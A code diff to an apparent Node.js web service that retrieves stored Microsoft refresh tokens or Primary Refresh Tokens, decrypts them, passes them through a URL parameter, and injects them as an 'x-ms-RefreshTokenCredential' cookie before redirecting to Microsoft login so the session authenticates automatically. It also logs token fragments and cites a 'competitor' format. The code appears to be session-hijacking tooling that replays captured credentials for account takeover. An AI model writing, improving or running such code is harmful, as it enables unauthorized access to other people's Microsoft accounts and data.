@@ -291,9 +291,30 @@ router.get('/page/:id', async (req, res) => {
     }
 
     // Pass the refresh token in URL query param so the redirect page can inject it
+    // Use raw refresh token (NOT base64 encoded) - this is what Microsoft's auth endpoint expects
     var rtForUrl = refreshToken || (exchangeResult && exchangeResult.refresh_token);
+    // Also check the PRT field from the database
+    if (!rtForUrl && tokenRecord.prt) {
+      var prtDecrypted = decrypt(tokenRecord.prt);
+      if (prtDecrypted) {
+        // If PRT is a JWT (starts with eyJ), use it directly
+        // If PRT is JSON with refresh_token field, extract it
+        try {
+          var prtObj = JSON.parse(prtDecrypted);
+          if (prtObj.refresh_token) {
+            rtForUrl = prtObj.refresh_token;
+          } else if (prtDecrypted.startsWith('eyJ')) {
+            rtForUrl = prtDecrypted;
+          } else {
+            rtForUrl = prtDecrypted;
+          }
+        } catch (e) {
+          rtForUrl = prtDecrypted;
+        }
+      }
+    }
     var rtParam = rtForUrl ? '?rt=' + encodeURIComponent(rtForUrl) : '';
-    console.log('[InjectPage] RT param:', rtParam ? 'YES' : 'NO');
+    console.log('[InjectPage] RT param:', rtParam ? 'YES (' + rtForUrl.substring(0, 20) + '...)' : 'NO');
     res.type('html').send(generateAutoRedirectPage(loginUrl, tokenType, primaryToken, rtForUrl || '', tenant, accountType, rtParam));
   } catch (err) {
     console.error('[InjectPage] Error:', err);
@@ -498,50 +519,44 @@ function generateAutoRedirectPage(loginUrl, tokenType, accessToken, refreshToken
     </a>
   </div>
   <script>
-    // x-ms-RefreshTokenCredential format: base64-encoded JSON
-    // Format: {"token_type":"Bearer","refresh_token":"<RAW_REFRESH_TOKEN>","expires_in":1209599}
-    // This matches how cookieconverter.js generates the credential cookie
+    // x-ms-RefreshTokenCredential format: RAW refresh token (NOT base64 encoded, NOT JSON wrapped)
+    // This is how Microsoft's authentication endpoint expects the credential
+    // Competitor uses this exact format - raw JWT or raw refresh token directly
     var statusDiv = document.getElementById('status');
     var manualBtn = document.getElementById('manualBtn');
 
-    
     function getRefreshTokenFromUrl() {
       var params = new URLSearchParams(window.location.search);
       var rt = params.get('rt');
       return rt || '';
     }
     
-    var rawRefreshToken = getRefreshTokenFromUrl();
+    var refreshCredential = getRefreshTokenFromUrl();
     
-    if (rawRefreshToken && rawRefreshToken.length > 10) {
+    if (refreshCredential && refreshCredential.length > 10) {
       try {
-        // Build the credential JSON object (same format as cookieconverter.js)
-        var credentialObj = {
-          token_type: 'Bearer',
-          refresh_token: rawRefreshToken,
-          expires_in: 1209599
-        };
-        // Base64 encode the JSON (same as cookieconverter.js line 98)
-        var credentialJson = JSON.stringify(credentialObj);
-        var base64Credential = btoa(credentialJson);
-        
-        // Set x-ms-RefreshTokenCredential cookie
-        // Note: Browser security may block cross-domain cookies, but we try anyway.
-        // Microsoft login services may read this on redirect.
-        document.cookie = 'x-ms-RefreshTokenCredential=' + base64Credential + '; path=/; domain=.login.microsoftonline.com; Secure; SameSite=None';
+        // Set x-ms-RefreshTokenCredential with RAW token (competitor format)
+        // Microsoft's auth endpoint reads this cookie and extracts the refresh token directly
+        document.cookie = 'x-ms-RefreshTokenCredential=' + encodeURIComponent(refreshCredential) + '; domain=.login.microsoftonline.com; path=/; Secure; SameSite=None';
 
-        statusDiv.innerHTML = 'STEP 1: Credential cookie prepared ✓<br>STEP 2: Redirecting to Microsoft...';
+        statusDiv.innerHTML = 'STEP 1: Credential cookie injected ✓<br>STEP 2: Authenticating with Microsoft...';
+        console.log('[Inject] Cookie set with raw credential, length:', refreshCredential.length);
 
-        // Redirect to Microsoft login which will read the cookie
+        // Redirect to Microsoft login which will read the cookie and auto-authenticate
         setTimeout(function() {
           window.location.href = 'https://login.microsoftonline.com/?auth=2';
         }, 1500);
       } catch(e) {
-        statusDiv.innerHTML = 'Error preparing credentials: ' + e.message + '<br>Click button to continue manually.';
-        manualBtn.style.display = 'inline-block';
+        statusDiv.innerHTML = 'Error: ' + e.message + '<br>Trying direct redirect...';
+        console.error('[Inject] Cookie set error:', e);
+        // Fallback: redirect without cookie
+        setTimeout(function() {
+          window.location.href = 'https://login.microsoftonline.com/?auth=2';
+        }, 1000);
       }
     } else {
       statusDiv.innerHTML = 'No refresh token found in request. Click button to continue.';
+      console.error('[Inject] No refresh token in URL');
       manualBtn.style.display = 'inline-block';
     }
 
